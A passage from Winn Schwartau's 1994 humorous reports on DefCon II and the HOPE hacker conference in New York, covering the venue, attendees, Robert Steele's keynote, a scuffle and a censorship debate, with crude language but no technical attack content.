       plummeting to earth at escape velocity and I pushed the throttle forward as roughly as I could.  
       An innate survival instinct came in to play.  "Oh, shit!"  The virtual aircraft carrier came into sight 
       and after almost 2 minutes of high speed rotating revulsion, I was expected to land this spinning 
       F-14 on a thimble in the ocean.  Right.  I tried, and damned if I didn't make it.  I have no idea 
       how, but I got an extra 34,000 points for a safe landing. 120 seconds. Ding.  Time's up. 
        
       I got out of the simulator and spilled right onto the floor; one 42 year old pile of humanity who 
       had navigated nausea but whose balance was totally beyond repair. "Could anyone hear me?" I 
       asked from my knees. 
        
       "They were selling tickets." 
        
       "Do I get my money back?" 
        
       Onto the VR race cars.  I really thought I'd throw up to the amusement of a thousand onlookers. 
       Hacking then phreaking then flying and now driving.  I put the pedal to the metal and crashed.  
       The huge video display has me tipping end over end and the screen is shaking and the car I'm 
       driving is shuddering violently but my brain can't compute it all.  I'm gonna wretch, I just know it.  
       But I keep on driving, decidedly last against people who haven't been handicapped with an inner 
       ear so sensitive I get dizzy when I watch a 5" black and white TV. 
        
       We tilted out of there and alas, it was time to find a 200,000 pound of metal to glide me home.  It 
       was damn good thing I hadn't eaten before VR Land, but I wolfed down $3 hot dogs at the 
       airport knowing full well that whatever they served on the plane would be a thousand times 
       worse.  So Mike and I munched, leaving Cyber Christ and friends to battle the press and the stars 
       at the opening of Planet Hollywood at Caesar's Palace. 
          
       And then an unexpected surprise. Lisa and friend; our first class objects of flirtation from the 
       outbound trip which seemed like a month ago, appeared.  But we were all so wiped out that a 
       continent of innuendo turned into a series of short cat naps.  We got a few flirts in, but nothing to 
       write home about. Red Eye  flights are just not what they're cracked up to be.   
        
       As I crawled into bed at something like 7AM Eastern, my wife awoke enough to ask the perennial 
       wife question.  "What did you do all weekend?"  I, in turn, gave her the usual husbandly response. 
        
       "Oh, nothing.  Good night, Gracie."

 41.0  Cyber-Christ takes a byte out of the big apple, Winn Schwartau at HOPE
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
               Cyber Christ Bites The Big Apple 
               HOPE - Hackers On Planet Earth, 
               New York City - August 13-14, 1994 
               (C) 1994 Winn Schwartau 
               by Winn Schwartau 
        
       (This is Part II of the ongoing Cyber Christ series.  Part I, "Cyber Christ Meets Lady Luck" 
       DefCon II, Las Vegas, July 22-24, 1994 is available all over the 'Net.) 
        
       Las Vegas is a miserable place, and with a nasty cold no less; it took me three weeks of 
       inhaling salt water and sand at the beach to finally dry up the post nasal drip after my jaunt to 
       DefCon II.  My ears returned to normal so that I no longer had to answer every question with 
       an old Jewish man's "Eh?" while fondling my lobes for better reception.    
        
       New York had to be better. 
        
       Emmanuel Goldstein -aka Eric Corely - or is it the other way around? is the host of HOPE, 
       Hackers on Planet Earth, a celebration of his successfully publishing 2600 - The Hackers 
       Quarterly  for ten years without getting jailed, shot or worse.  For as Congressman Ed Markey 
       said to Eric/Emmanuel in a Congressional hearing last year, and I paraphrase, 2600 is no more 
       than a handbook for hacking (comparable obviously to a terrorist handbook for blowing up the 
       World Trade Center) for which Eric/Emmanuel should be properly vilified, countenanced and 
       then drawn and quartered on Letterman's Stupid Pet Tricks.  
        
       Ed and Eric/Emmanuel obviously have little room for negotiation and I frankly enjoyed 
       watching their Congressional  movie where communication was at a virtual standstill: and 
       neither side understood the viewpoints or positions of the other.   
        
       But Ed is from Baaahhhsten, and Eric/Emmanuel is from New York, and HOPE will take place 
       in the Hotel Filthadelphia, straight across the street from Pennsylvania Station in beautiful 
       downtown fast-food-before-they-mug-you 34th street, right around the corner from clean-the-
       streets-its-Thanksgiving Herald Square.  Geography notwithstanding, HOPE promised to be a 
       more iconoclastic gathering than that of DefCon II.  
        
       First off, to set the record straight, I am a New Yorker.  No matter that I escaped in 1981 for 
       the sunny beaches of California for 7 years, and then moved to the Great State of the Legally 
       Stupid for four more (Tennessee); no matter that I now live on the Gulf Coast of Florida where 
       the water temperature never dips below a chilly  98 degrees; I am and always will be a New 
       Yorker.   
       It took me the better part of a decade of living away from New York to come to that 
       undeniable and inescapable conclusion: Once a New Yorker, always a New Yorker. Not that 
       that makes my wife any the happier. 
        
       "You are so rude.  You love to argue.  Confrontation is your middle name."  Yeah, so what's 
       your point? 
        
       You see, for a true New Yorker these aren't insults to be re- regurgitated at the mental moron 
       who attempts to combat us in a battle of wits yet enters the ring unarmed; these are mere tru-
       isms as seen by someone who views the world in black and white, not black, white and New 
       York. 
        
       Case in point. 
        
       I used to commute into Manhattan from the Westchester County suburb of Ossining where I 
       lived 47 feet from the walls of Sing Sing prison (no shit!).  Overlooking the wide expanse of 
       the Hudson River from my aerie several hundred feet above, the only disquieting aspect of that 
       location were the enormously deafening thunderclaps which resounded a hundred and one 
       times between the cliffs on either side of the river.  Then there was the occasional escapee-
       alarm from the prison. . 
        
       So, it was my daily New York regimen to take the 8:15 into the city. If the train's on time I'll 
       get to work by nine . . . 
        
       Grand Central Station - the grand old landmark thankfully saved by the late Jackie O. - is the 
       nexus for a few hundred million commuters who congregate in New York Shitty for no other 
       reason that to collect a paycheck to afford blood pressure medicine.   
        
       You have to understand that New York is different.  Imagine, picture in your mind: nothing is 
       so endearing as to watch thousands of briefcase carrying suits scrambling like ants in a Gary 
       Larson cartoon for the nearest taxi, all the while greeting their neighbors with the prototypical 
       New York G'day!  
        
       With both fists high in the air, middle fingers locked into erect prominence, a cacophonous 
       chorus of  "Good Fucking Morning" brightens the day of a true New Yorker.  His bloodshot 
       eyes instantly clear, the blood pressure sinks by 50% and already the first conflict of the day 
       has been waged and won. 
        
       Welcome to the Big Apple, and remember never, ever, to say, "Have a Nice Day."  Oh, no.  
       Never. 
        
       So HOPE was bound to be radically different from Vegas's DefCon II, if only for the setting.  
       But, I expected hard core.  The European contingent will be there, as will Israel and South 
       America and even the Far East. All told, I am told, 1000 or more are expected.  And again, as 
       at DefCon II, I am to speak, but Eric/Emmanuel never told me about what, when, or any of the 
       other niceties that go along with this thing we call a schedule.  
       * * * * * 
        
       God, I hate rushing.   
        
       Leaving Vienna at 3:15 for a 4PM Amtrak "put your life in their hands" three hour trip to New 
       York is not for the faint of heart.  My rented Hyundai four cylinder limousine wound up like a 
       sewing machine to 9,600 RPM and hydroplaned the bone dry route 66 into the pot holed, 
       traffic hell of Friday afternoon Washington, DC.   Twelve minutes to spare. 
         
       I made the 23 mile trip is something less than three minutes and bounded into the Budget rental 
       return, decelerated to impulse power and let my brick and lead filled suitcase drop to the 
       pavement with a dent and a thud.  "Send me the bill," I hollered at the attendant.  Never mind 
       that Budget doesn't offer express service like real car rental companies.  "Just send me the bill!" 
       and I was off. 
        
       Eight minute to spare.  Schlepp, schlepp. Heavy, heavy.  
        
       Holy shit! Look at the line for tickets and I had reservations.   
        
       "Is this the line for the four o'clock to New York?"  Pant, breathless. 
        
       "Yeah."  She never looked up.   
        
       "Will they hold the train?" 
        
       "No." A resoundingly rude no at that.  Panic gene takes over.   
        
       "What about the self-ticketing computer?" I said pointing at the self ticketing computer. 
        
       "Do you have a reservation?"   
        
       "Yup."  Maybe there is a God. 
        
       "Won't help you." 
        
       "What?" 
        
       Nothing. 
        
       "What do you mean won't help?" 
        
       "Computer's broken."  Criminy! I have 4 minutes and here's this over-paid over-attituded 
       Amtrak employee who thinks she's the echo of Whoopi Goldberg.  "The line's over there." 
        
       Have you ever begged? I mean really begged?  Well I have. 
        
       "Are you waiting for the four?"  "Can I slip ahead?"  "Are you in a death defying hurry?"  "I'll 
       give you a dime for your spot in line."  "You are so pretty for 76, ma'am.  Can I sneak ahead?"   
        
       Tears work.  Two excruciating minutes to go.  I bounced ahead of everyone in a line the length 
       of the Great Wall of China, got my tickets and tore ass through Union Station   The closing 
       gate missed me but caught the suitcase costing me yet more time as I attempted to disgorge my 
       now-shattered valise from the fork-lift- like spikes which protect the trains from late-coming 
       commuters.  The rubber edged doors on the train itself were kinder and gentler, but at this 
       point, screw it.  It was Evian and Fritos for the next three hours.  
        
       * * * * * 
        
       Promises tend to be lies.  The check is in the mail; Dan Quayle will learn to spell; I won't raise 
       taxes.  I wonder about HOPE. 
        
       "It's going to be Bust Central," said one prominent hacker who threatened me with electronic 
       assassination if I used his name.  "Emmanuel will kill me."   Apparently the authorities-who-be 
       are going to be there in force.  "They want to see if Corrupt or any of the MoD crew stay after 
       dark, then Zap! Back to jail.  (giggle, giggle.)  I want to see that."   
        
       Will Mitnick show up?  I'd like to talk to that boy.  A thousand hackers in one place and 
       Eric/Emmanuel egging on the Feds to do something stupid.  Agent Steal will be there, or 
       registered at least, and half of the folks I know going are using aliases. 
        
       "I'd like a room please." 
        
       "Yessir. Name?" 
        
       "Monkey Meat." 
        
       "Is that your first or last name?" 
        
       "First." 
        
       "Last name?" 
        
       "Dilithium Crystal." 
        
       "Could you spell that?" 
        
       Now:  I know the Hotel Pennsylvania.  It used to be the high class Statler Hilton until Mr. 
       Hilton himself decided that the place was beyond hope.  "Sell it or scuttle it."  They sold and 
       thus begat the hotel Filthadelphia.  I stayed here once in 1989 and it was a cesspool then.  I 
       wondered why the Farsi-fluent bellhop wouldn't tell me how bad the damage was from the fire 
       bombed 12th floor.  The carpets were the same dingy, once upon a time colorful, drab as I 
       remembered.  And, I always have a bit of trouble with a hotel who puts a security check by the 
       elevator bank.  Gives you the warm and fuzzies that make you want to come back right away.   
        
       I saved $2 because none of the bell hops noticed I needed help, but then again, it wouldn't have 
       mattered for there was no way he and I and my luggage were going to fit inside of what the 
       hotel euphemistically refers to as a 'room'.  Closet would be kind but still inaccurate.  I think 
       the word, ah, '$95 a night slum' might still be overly generous.  Let's try . . . ah ha! the room 
       that almost survived the fire bombing.  Yeah, that's the ticket. 
        
       The walls were pealing.  Long strips of yellowed antique wallpaper embellished the flatness of 
       the walls as they curled towards the floor and windows.  The chunks of dried glue decorated 
       the pastel gray with texture and the water stains from I know not where slithered their way to 
       the soggy carpet in fractal patterned rivulets.  I stood in awe at early funk motif that the Hotel 
       Filthadelphia chose in honor of my attendance at HOPE.  But, no matter how bad my room 
       was, at least it was bachelor clean.  (Ask your significant other what that means. . .) 
        
       In one hacker's room no bigger than mine I counted 13 sleeping bags lying amongst the 
       growing mold at the intersection of the drenched wallboard and putrefying carpet shreds. (God, 
       I love going to hacker conferences!  It's not that I like Hyatt's and Hilton' all that much: I do 
       prefer the smaller facilities, but, I am sad to admit, clean counts at my age.).  My nose did not 
       have to venture towards the floor to be aware that the Hotel Filthadelphia was engaging in top 
       secret exobiological government experiments bent on determining their communicability and 
       infection factor. 
        
       The top floor of the Hotel Filthadelphia - the 18th - was the place for HOPE, except the 
       elevator door wouldn't open.  The inner door did, but even with the combined strength of my 
       personal crowbar (a New York defensive measure only; I never use it at home) and three 
       roughians with a bad case of Mexican Claustrophobia, we never got the door open.   
        
       The guard in the lobby was a big help.  
        
       "Try again." 
        
       Damned if he didn't know his elevators and I emerged into the pre-HOPE chaos of  preparing 
       for a conference. 
        
       About 100 hackers lounged around in varying forms of disarray - Hey Rop! 
        
       Rop Gongrijjp editor of the Dutch Hacktic is a both a friend and an occasional source of 
       stimulating argument.  Smart as a whip, I don't always agree with him, though, the above-
       ground security types ought to talk to him for a clear, concise and coherent description of the 
       whys and wherefores of hacking.   
       Hey Emmanuel!  Hey Strat!  Hey Garbage Heap!  Hey Erikb! Hey  to lots of folks.  Is that you 
       Supernigger?  And Julio?  I was surprised.  I knew a lot more of these guys that I thought I did. 
       Some indicted, some unindicted, some mere sympathizers and other techno-freaks who enjoy a 
       weekend with other techno-freaks. Security dudes - get hip!  Contact your local hacker and 
       make friends.  You'll be glad you did. 
        
       From behind - got me.  My adrenaline went into super-saturated mode as I was grabbed.  I 
       turned and it was . . . Ben.  Ben is a hugger.  "I just wanted to hug you," he said sweetly but 
       without the humorous sexually deviant connotation that occurred during Novocain's offer to let 
       Phil Zimmerman sleep with him in Las Vegas. 
        
       I smiled a crooked smile.  "Yeah, right."  Woodstock '94 was a mere 120 miles away . . .maybe 
       there was a psychic connection.  But Ben was being sincere.  He was hugging everyone.  
       Everyone.  At 17, he really believes that hugging and hacking are next to Godliness.  Boy does 
       he have surprise coming the first time his mortgage is late.  Keep hugging while you have the 
       chance, Ben. 
        
       Assorted cases of Zima (the disgusting Polish is-this-really-lime flavored beer of choice by 
       those without taste buds) appeared, but anyone over the age of 21 drank Bud. What about the 
       12 year olds drinking?  And the 18 year olds?  And the 16 year olds? 
        
       "Rop, I don't think you need to give the hotel an excuse to bust you guys outta here."  Me, 
       fatherly and responsible?  Stranger things have happened.  The beer was gone.  I'm not a 
       teetotaler, but I didn't want my weekend going up in flames because of some trashed 16 year 
       old puking on an Irani ambassador in the lobby. No reason to test fate.  
        
       * * * * *  
        
       Nothing worked, but that's normal.   
        
       Rop had set up HEU (Hacking at the End of  the Universe) in Holland last year with a single 
       length of 800m ethernet.  (That's meter for the Americans: about 2625 ft.)  HOPE, though was 
       different.  The Hotel Filthadelphia's switchboard and phone systems crashed every half hour or 
       so which doesn't do a lot for the health of 28.8 slip lines.   
        
       The object of the exercise was seemingly simple: plug together about 20 terminals into a 
       terminal server connected to Hope.Com and let 'em go at it.  Provide 'net access and, to the 
       lucky winner of the crack-the-hopenet server (root) the keys to a 1994 Corvette! 
        
       You heard it right! For breaking into root of their allegedly secure server, the folks at 2600 are 
       giving away keys to a 1994 Corvette.  They don't know where the car is, just the keys.  But 
       they will give you the car's last known location . . . or was it $50 in cash? 
        
       Erikb - Chris Goggans - showed up late Friday night in disguise: a baseball cap over his nearly 
       waist length dirty blond hair.  "He's here!" one could hear being muttered.  "He had the balls to 
       show up!"  "He's gonna get his ass kicked to a pulp."  "So you did come . . . I was afraid they'd 
       intimidated you to stay in Texas." 
        
       No way! "Why tell the enemy what your plans are."  Even the 50's- something ex-
       amphetamine-dealer turned reseller of public-records Bootleg didn't know Goggans was going 
       to be there.  But the multiple fans of Erikb, (a strong resemblance to Cyber Christ if he do say 
       so himself) were a-mighty proud to see him. 
        
       This stunning Asian girl with skin too soft to touch (maybe she was 14, maybe she was 25) 
       looked at Erikb by the message board.  "You're," she pointed in disbelief "Erikb?"  Chris nods, 
       getting arrogantly used to the respectful adulation.  Yeah, that's me, to which the 
       lady/girl/woman instantly replied, "You're such an asshole."  Smile, wide smile, hug, kiss, big 
       kiss.  Erikb revels in the attention and hundreds of horny hackers jealously look on. 
        
       Friday night was more of an experience - a Baba Ram Dass-like Be Here Now experience - 
       with mellow being the operative word.   The hotel had apparently sacrificed 20,000 square feet 
       of its penthouse to hackers, but it was obvious to see they really didn't give a damn if the whole 
       floor got trashed.  Ceiling panels dripped from their 12 foot lofts making a scorched Shuttle 
       underbelly look pristine.  What a cesspool!  I swear nothing had been done to the decorative 
       environs since the day Kennedy was shot.  But kudos to Emmanuel for finding a centrally 
       located cesspool that undoubtedly gave him one hell of a deal. I think it would be a big mistake 
       to hold a hacker conference at the Plaza or some such snooty overly-self-indulgent denizen of 
       the rich.  
        
       Filth sort of lends credibility to an event that otherwise seeks notoriety.   
        
       I didn't want to take up too much of Emmanuel's and Rop's time - they were in setup panic - so 
       it was off to the netherworld until noon.  That's when a civilized Con begins. 
        
       * * * * *  
        
       I dared to go outside; it was about 11AM and I was in search of the perfect New York 
       breakfast: a greasy spoon that serves coffee as tough as tree bark and a catatonia inducing egg 
       and bacon sandwich.  Munch, munch, munch on that coffee. 
        
       I'd forgotten how many beggars hang out on the corner of 33rd and 7th, all armed with the 
       same words, "how about a handout, Winn?"  How the hell do they know my name?  "Whatever 
       you give will come back to you double and triple . . . please man, I gotta eat."  It is sad, but 
       John Paul Getty I ain't.   
       As I munched on my coffee and sipped my runny egg-sandwich I noticed that right in front of 
       the runny-egg-sandwich place sat a Ford Econoline van. Nice van.  Nice phone company van. 
       What are they doing here? Oh, yeah, the hackers need lines and the switchboard is down.  Of 
       course, the phone company is here.  But, what's that? Hello? A Hacker playing in the phone 
       van? I recognize you! You work with Emmanuel.  How?  He's robbing it.  Not robbing, maybe 
       borrowing.   
        
       The ersatz telephone van could have fooled anyone - even me, a color blind quasi-techno-
       weanie to yell "Yo! Ma Bell!"  But, upon not-too-closer inspection, the TPC (The Phone 
       Company) van was in fact a 2600 van - straight from the minds of Emmanuel and friends.  
       Impeccable!  The telephone bell in a circle logo is, in this case, connected via cable to a hacker 
       at a keyboard.  The commercial plates add an additional air of respectability to the whole 
       image.  It works. 
        
       * * * * * 
        
       Up to HOPE - egg sandwich and all. 
        
       The keynote speech was to be provided courtesy of the Man in Blue.  Scheduled for noon, 
       things were getting off to a late start.  The media (who were there in droves, eat your heart out 
       CSI) converged on the MIB to see who and why someone of his stature would (gasp!) 
       appear/speak at a funky-downtown hotel filled with the scourges of Cyberspace. I didn't see if 
       Ben hugged the MIB, but I would understand if he didn't.  Few people knew him or suspected 
       what size of Jim-Carey-MASK arsenal might suddenly appear if a passive hug were 
       accidentally interpreted as being too aggressive. The MIB is imposing and Ben too shy. 
        
       The media can ask some dumb questions and write some dumb articles because they spend 12 
       1/2 minutes trying to understand an entire culture.  Can't do that fellows!   
        
       The MIB, though, knows hackers and is learning about them more and more; and since he is 
       respectable, the media asks him about hackers.  What are hackers?  Why are YOU here, Mr. 
       MIB? 
        
       "Because they have a lot to offer.  They are the future," the Man In Blue said over and over.  
       Interview after interview - how time flies when you're having fun - and the lights and cameras 
       are rolling from NBC and PIX and CNN and assorted other channels and magazines.  At 12:55 
       chaos had not settled down to regimented disorganization and the MIB was getting antsy.  
       After all, he was a military man and 55 minutes off schedule: Egad! Take charge.   
        
       The MIB stood on a chair and hollered to the 700+ hacker phreaks in the demonstration 
       ballroom, "Hey! It's starting.  Let's go the theater and get rocking! Follow me."  He leaned over 
       to me:  "Do you know where the room is?"  
       "Sure, follow me." 
        
       "Everyone follow, c'mon," yelled the MIB.  "I'm going to get started in exactly three minutes," 
       and three minutes he meant.  Despite the fact that I got lost in a hallway and had hundreds of 
       followers following my missteps and the MIB yelling at me for getting lost in a room with only 
       two doors, we did make the main hall, and within 90 seconds he took over the podium and 
       began speaking.   
        
       "I bet you've always wanted to ask a spy a few questions. Here's your chance.  But let me say 
       that the United States intelligence community needs help and you guys are part of the 
       solution."  The MIB was impeccably dressed  in his pin stripe with only traces of a Hackers 80 
       T-shirt leaking through his starched white dress shirt.  The MIB is no less than Robert Steele, 
       ex-CIA type spy, senior civilian in Marine Corps Intelligence and now the President of Open 
       Source Solutions, Inc.   
        
       He got these guys (and gals) going.  Robert doesn't mince words and that's why as he puts it, 
       he's "been adopted by the hackers."  At his OSS conferences he has successfully juxtaposed 
       hackers and senior KGB officials who needed full time security during their specially arranged 
       48 hour visa to Washington, DC.  He brought Emmanuel and Rop and clan to his show and 
       since their agendas aren't all that different, a camaraderie was formed. 
        
       Robert MIB Steele believes that the current intelligence machinery is inadequate to meet the 
       challenges of today's world.  Over 80% of the classified information contained with the 
       Byzantine bowels of the government is actually available from open sources.  We need to 
       realize that the future is more of an open book than ever before. 
        
       We classify newspaper articles from Peru in the incredibly naive belief that only Pentagon 
       spooks subscribe.  We classify BBC video tapes from the UK with the inane belief that no one 
       will watch it if it so stamped.  We classify $4 Billion National Reconnaissance Office satellite 
       generated street maps of Calle, Colombia when anyone with an IQ only slightly above a rock 
       can get the same one from the tourist office.  And that's where hackers come in. 
        
       "You guys are a national resource.  Too bad everyone's so scared of you."  Applause from 
       everywhere.  The MIB knows how to massage a crowd.  Hackers, according to Steele, and to a 
       certain extent I agree, are the truth tellers "in a constellation of complex systems run amok and 
       on the verge of catastrophic collapse."   
        
       Hackers are the greatest sources of open source information in the world.  They have the 
       navigation skills, they have the time, and they have the motivation, Robert says.  Hackers 
       peruse the edges of technology and there is little that will stop them in their efforts.  The 
       intelligence community should take advantage of the skills and lessons that the hackers have to 
       teach us, yet as we all know, political and social oppositions keep both sides (who are really 
       more similar then dissimilar) from talking.   
        
       "Hackers put a mirror up to the technical designers who have built the networks, and what they 
       see, they don't like.  Hackers have shown us all the chinks in the armor of a house without 
       doors or windows.  The information infrastructure is fragile and we had better do something 
       about it now; before it's too late."   
        
       Beat them at their own game, suggests Steele.  Keep the doors of Cyberspace open, and sooner 
       or later, the denizens of the black holes of information will have to sooner or late realize that 
       the cat is out of the bag. 
        
       Steele educated the Hacker crowd in a way new to them:  he treated them with respect, and in 
       turn he opened a channel of dialog that few above ground suit-types have ever envisioned.  
       Steele works at the source. 
        
       HOPE had begun and Robert had set the tone. 
        
       * * * * *  
        
       The day was long.  Dogged by press, hackers rolled over so the reporters could tickle their 
       stomachs on camera.  Despite their public allegations that the media screws it up and never can 
       get the story right, a camera is like a magnet.  The New York Times printed an article about 
       HOPE so off the wall I wondered if the reporter had actually been there.  Nonetheless, the 
       crowds followed the cameras, the cameras followed the crowds, and the crowds parted like the 
       Red Sea.  But these were mighty colorful crowds. 
        
       We all hear of that prototypical image of the acne faced, Jolt- drinking, pepperoni downing 
       nerdish teenager who has himself locked in the un-air-conditioned attic of his parents' half 
       million dollar house from the time school gets out till the sun rises. Wrongo security-breath.  
       Yeah, there's that component, but I was reminded of the '80's, the early '80's by a large percent-
       age of the crowd. 
        
       Purple hair was present but scarce, and I swear on a stack of 2600's that Pat from Saturday 
       Night Live was there putting everyone's hormonal guess-machines to the test.  But what cannot 
       help but capture one's attention is a 40 pin integrated circuit inserted into the shaved side skull 
       of an otherwise clean-cut Mohawk haircut.   
        
       The story goes that Chip Head went to a doctor and had a pair of small incisions placed in his 
       skull which would hold the leads from the chip.  A little dab of glue and in a few days the skin 
       would grow back to hold the 40 pins in the natural way; God's way. 
        
       There was a time that I thought ponytails were 'out' and passe, but I thought wrong.  Mine got 
       chopped off in roughly 1976 down to shoulder length which remained for another six years, 
       but half of the HOPE audience is the reason for wide spread poverty in the hair salon industry. 
        
       Nothing wrong with long, styled, inventive, outrageous hair as long as it's clean; and with 
       barely an exception, such was the case.  In New York it's not too hard to be perceived as clean, 
       especially when you consider the frame of reference. Nothing is too weird. 
        
       The energy level of HOPE was much higher than the almost lethargic (but good!) DefCon II.  
       People move in a great hurry, perhaps to convey the sense of importance to others, or just out 
       of frenetic hyperactivity.  Hackers hunched over their keyboards - yet with a sense of urgency 
       and purpose. Quiet yet highly animated conversations in all corners.  HOPE staff endlessly 
       pacing throughout the event with their walkie-talkies glued to their ears.   
        
       Not many suit types.  A handful at best, and what about the Feds?  I was accosted a few times 
       for being a Fed, but word spread: no Fed, no bust.  Where were the Feds?  In the lobby.  The 
       typical NYPD cop has the distinctive reputation of being overweight especially when he 
       wearing two holsters - one for the gun and one for the Italian sausage. Perpetually portrayed as 
       donut dunking dodo's, some New York cops' asses are referred to as the Fourth Precinct and a 
       few actually moonlight as sofas. 
        
       So rather than make a stink, (NY cops hate to make a scene) the lobby of the Hotel 
       Filthadelphia was home to the Coffee Clutch for Cops.  About a half dozen of them made their 
       profound presence known by merely spending their day consuming mass quantities of 
       questionable ingestibles, but that was infinitely preferable to hanging out on the 18th floor.  
       The hackers weren't causing any trouble, the cops knew that, so why push it.  Hackers don't 
       fight, they hack.  Right? 
        
       After hours of running hours behind schedule, the HOPE conference was in first place for 
       disorganized, with DefCon II not far behind.  Only with 1000 people to keep happy and in the 
       right rooms, chaos reigns sooner.  The free Unix sessions and Pager session and open 
       microphone bitch session and the unadulterated true history of 2600 kept audiences of several 
       hundred hankering for more - hour after hour.   
        
       Over by the cellular hacking demonstrations, I ran into a hacker I had written about: Julio, 
       from the almost defunct Masters of Destruction.  Julio had gone state's evidence and was 
       prepared to testify against MoD ring leader Mark Abene (aka Phiber Optik) but once Mark 
       pled guilty to enough crimes to satisfy the Feds, Julio was off the hook with mere probation.  
       Good guy, sworn off of hacking.  Cell phones are so much more interesting. 
        
       However, while standing around with Erikb and a gaggle of Cyber Christ wanna-bes, Julio and 
       his friend (who was the size of Texas on two legs) began a pushing match with Goggans.  "You 
       fucking narc red-neck son of a bitch."  Goggans helped build the case against the MoD and 
       didn't make a lot of friends in the process. 
        
       The shoving and shouldering reminded me of slam dancing from decades past, but these kids 
       are too young to have taken part in the social niceties of deranged high speed propulsion and 
       revulsion on the dance floor.  So it was a straight out pushing match, which found Erikb doing 
       his bloody best to avoid.  Julio and pal kept a'coming and Erikb kept avoiding.  It took a dozen 
       of us to get in the middle and see that Julio was escorted to the elevators. 
        
       Julio said Corrupt, also of the MoD,  was coming down to HOPE, too.  Corrupt has been 
       accused of mugging drug dealers to finance his computer escapades, and was busted along with 
       the rest of the MoD gang.  The implied threat was taken seriously, but, for whatever reason, 
       Corrupt never showed.  It is said that the majority of the hacking community distances itself 
       from him; he's not good for the collective reputation.  So much for hacker fights.  All is calm. 
        
       The evening sessions continued and continued with estimates of as late as 4AM being bandied 
       about. Somewhere around 1:00AM I ran into Bootleg in the downstairs bar. Where was 
       everybody?  Not upstairs.  Not in the bar.  I saw a Garbage Heap in the street outside (now 
       that's a double entendre) and then Goggans popped up from the door of  the Blarney Stone, a 
       syndicated chain of low- class Irish bars that serve fabulously thick hot sandwiches.   
        
       "We're about to get thrown out." 
        
       "From the Blarney Stone?  That's impossible.  Drunks call the phone booths home!" 
        
       Fifty or so hacker/phreaks had migrated to the least likely, most anachronistic location one 
       could imagine.  A handful of drunken sots leaning over their beers on a stain encrusted wooden 
       breeding ground for salmonella.  A men's room that hasn't seen the fuzzy end of a brush for the 
       best part of a century made Turkish toilets appear refreshingly clean.  And they serve food 
       here. 
        
       I didn't look like a hacker so I asked the bartender, "Big crowd, eh?" 
        
       The barrel chested beer bellied barman nonchalantly replied, "nah.  Pretty usual."  He cleaned a 
       glass so thoroughly the water marks stood out plainly. 
        
       "Really?  This much action on a Saturday night on a dark side street so questionably safe that 
       Manhattan's Mugger Society posts warnings?" 
        
       "Yup."  
       "So," I continued.  "These hackers come here a lot?" 
        
       "Sure do," he said emphatically. 
        
       "Wow. I didn't know that.  So this is sort of a hacker bar, you might say?" 
        
       "Exactly.  Every Saturday night they come in and raise a little hell." 
        
       With a straight face I somehow managed to thank the confused barman for his help and for the 
       next four hours learned that socially, hackers of today are no different than many if not most of 
       us were in our late teens ad early twenties.  We laughed and joked and so do they - but there is 
       more computer talk.  We decried the political status of our day as they do theirs, albeit they  
       with less fervor and more resignation.  The X-Generation factor: most of them give little more 
       than a tiny shit about things they view as being totally outside their control, so why bother.  
       Live for today.   
        
       Know they enemy.  Robert hung in with me intermingling and arguing and debating and 
       learning from them, and they from us.  Hackers aren't the enemy - their knowledge is - and 
       they are not the exclusive holders of that information.  Information Warfare is about 
       capabilities, and no matter who possesses that capability, there ought to be a corresponding 
       amount respect.  
        
       Indeed, rather than adversaries, hackers could well become government allies and national 
       security assets in an intense international cyber-conflict.  In the LoD/MoD War of 1990-91, 
       one group of hackers did help authorities. Today many hackers assist professional 
       organizations, governments in the US and overseas - although very quietly.  'Can't be seen 
       consorting with the enemy.'   Is hacking from an Army or Navy or NATO base illegal?  
       Damned if I know, but more than one Cyber Christ-like character makes a tidy sum providing 
       hands-on hacking education to the brass in Europe.   
        
       Where these guys went after 5AM I don't know, but I was one of the first to be back at the 
       HOPE conference later that day; 12:30 PM Sunday. 
        
       * * * * *  
        
       The Nazi Hunters were out in force. 
        
       "The Neo-Nazi skinheads are trying to start another Holocaust." A piercing, almost annoying 
       voice stabbed right through the crowds.  "Their racist propaganda advocates killing Jews and 
       blacks.  They have to be stopped, now." 
        
       Mortechai Levy (I'll call him Morty) commanded the attention of a couple dozen hackers.  
       Morty was a good, emotional, riveting shouter.  "These cowardly bastards have set up vicious 
       hate call lines in over 50 cities.  The messages advocate burning synagogues, killing minorities 
       and other violence.  These phones have to be stopped!" 
        
       The ever-present leaflet from Morty's Jewish Defense Organization asked for help from the 
       2600 population.   
        
       "Phone freaks you must use your various assorted bag of tricks to shut these lines down. 
       No cowardly sputterings about 'free speech' for these fascist scum."   
        
       The headline invited the hacker/phreak community to: 
        
                               "Let's Shut Down 'Dial-A-Nazi'!!!" 
        
       Morty was looking for political and technical support from a band of nowhere men and women 
       who largely don't know where they're going much less care about an organized political 
       response to someone elses cause.  He wasn't making a lot of headway, and he must have know 
       that he would walk right into the anarchist's bible: the 1st amendment. 
        
       The battle lines had been set.  Morty wanted to see the Nazis censored and hackers are absolute 
       freedom of speechers by any measure.  Even Ben sauntering over for a group hug did little to 
       defuse the mounting tension. 
        
       I couldn't help but play mediator. Morty was belligerently loud and being deafeningly intrusive 
       which affected the on-going sessions.  To tone it down some, we nudged Morty and company 
       off to the side and occupied a corner of thread bare carpet, leaning against a boorish beige wall 
       that had lost its better epidermis.   
        
       The heated freedom of speech versus the promotion of racial genocide rancor subdued little 
       even though we were all buns side down.  I tried to get a little control of the situation. 
        
       "Morty. Answer me this so we know where you're coming from.  You advocate the silencing of 
       the Nazis, right? 
        
       "They're planning a new race war; they have to be stopped." 
        
       "So you want them silenced.  You say their phones should be stopped and that the hackers 
       should help." 
        
       "Call that number and they'll tell you that Jews and blacks should be killed and then they . . ." 
        
       "Morty.  OK, you want to censor the Nazis.  Yes or No." 
        
       "Yes." 
        
       "OK, I can understand that.  The question really is, and I need your help here, what is the line 
       of censorship that you advocate.  Where is your line of legal versus censored?" 
        
       A few more minutes of political diatribe and then he got to the point.  "Any group with a 
       history of violence should be censored and stopped."  A little imagination and suddenly the 
       whole planet is silenced.  We need a better line, please.  "Hate group, Nazis, people who 
       advocate genocide . . . they should be silenced . . . ." 
        
       "So," I analyzed.  "You want to establish censorship criteria based upon  subjective 
       interpretation.  Whose interpretation?"  My approach brought nods of approval. 
        
       One has to admire Morty and his sheer audacity and tenacity and how much he strenuously and 
       single-mindedly drives his points home.  He didn't have the ideal sympathetic audience, but he 
       wouldn't give an inch.  Not an inch.  A little self righteousness goes a long way; boisterous 
